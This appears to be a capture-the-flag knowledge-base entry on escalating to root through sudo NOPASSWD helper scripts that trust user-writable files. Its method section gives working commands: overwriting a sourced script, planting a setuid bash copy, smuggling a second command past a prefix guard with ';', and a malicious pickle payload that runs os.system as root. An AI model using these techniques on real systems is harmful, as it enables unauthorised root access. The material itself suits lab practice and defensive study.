---
id: sudo-nopasswd-writable-input-exec
category: PWN
tags: [privesc, sudo, nopasswd, sudoers, wrapper-script, writable-script, bash-c, source, pickle, insecure-deserialization, command-injection, gtfobins, root]
tools: []
manuals: []
title: "sudo NOPASSWD wrapper that runs attacker-controlled input as root"
difficulty: medium
created: 2026-11-06
updated: 2026-11-06
related: [boot2root-methodology-checklist, sudo-helper-forgeable-mac-gate, command-injection]
---

## How to recognize this pattern

- `sudo -l` shows a `(root) NOPASSWD:` entry on a root-owned helper (a shell script, a Python
  script, or a small binary), not on a shell directly.
- The helper, when you read it, pulls in something you can write: a script in your home, a data
  file it parses, a config it `source`s, an object it deserializes. The root privilege is handed
  to whatever that input says.

The vulnerability is a trust boundary error: the wrapper runs as root but takes its instructions
from a file a non-root user owns or can modify.

## Method

Read the helper first (`cat`/`file` the target of the sudo rule, follow what it executes). Then
match the shape:

### A. Wrapper executes or sources a file you can write
```bash
# helper does:  bash /home/<you>/sync.sh     (or:  source /home/<you>/x.env)
printf '#!/bin/sh\ncat /root/root.txt\n' > ~/sync.sh && chmod +x ~/sync.sh
sudo /path/to/helper
# interactive root instead:
printf '#!/bin/sh\ncp /bin/bash /tmp/rb; chmod 4755 /tmp/rb\n' > ~/sync.sh; sudo /path/to/helper; /tmp/rb -p
```
When it `source`s an env file, any `$(...)` runs as root: `TITLE=$(cat /root/root.txt)`.

### B. Wrapper runs lines from a data file through a shell, behind a weak guard
```bash
# helper does:  while read line; do [[ "$line" == FOO* && "$line" == *bar* ]] && bash -c "$line"; done < ~/data.txt
# satisfy the guard, then use ; to append your own command (runs as root)
printf 'FOO bar; cat /root/root.txt\n' > ~/data.txt && sudo /path/to/helper
```
A string guard that only checks a prefix/substring is not a sandbox. A `;`, `&&`, newline or
`$(...)` carries a second command past it.

### C. Wrapper deserializes a file you own
```bash
# helper does:  pickle.load(open('/home/<you>/job.pkl','rb'))  as root
python3 - <<'PY'
import pickle, os
class E:
    def __reduce__(self): return (os.system, ("cat /root/root.txt",))
pickle.dump(E(), open("/home/<you>/job.pkl","wb"))
PY
sudo /path/to/helper
```
Python `pickle`, PyYAML `yaml.load` (unsafe), Ruby `Marshal`, Java `readObject`: loading an
attacker-controlled blob is code execution. See `command-injection` for the shell-level variants.

## Gotchas

- Read the helper before acting. The exploit is whichever input it trusts; guessing wastes the one
  thing these boxes rate-limit (submissions).
- `sudo -l` may list the rule with arguments pinned. If the path is fixed but the file content is
  yours, you still win (shapes A to C). If the argument itself is yours, it may be a straight
  `gtfobins` call.
- A guard checking the file's wire format (for example that text is valid base64) does not check
  the decoded command. Validate the decoded value, not the representation.
- Not this pattern if the wrapper writes to a root-only file, drops privileges before touching your
  input, or passes argv arrays without a shell. Then look for setuid binaries or capabilities.

## Related / Cross-reference

- `boot2root-methodology-checklist`: this is the usual stage-4 root step.
- `sudo-helper-forgeable-mac-gate`: when the helper guards with an integrity check you can forge.
- `command-injection`: separators and filter bypass for the shape-B guard.
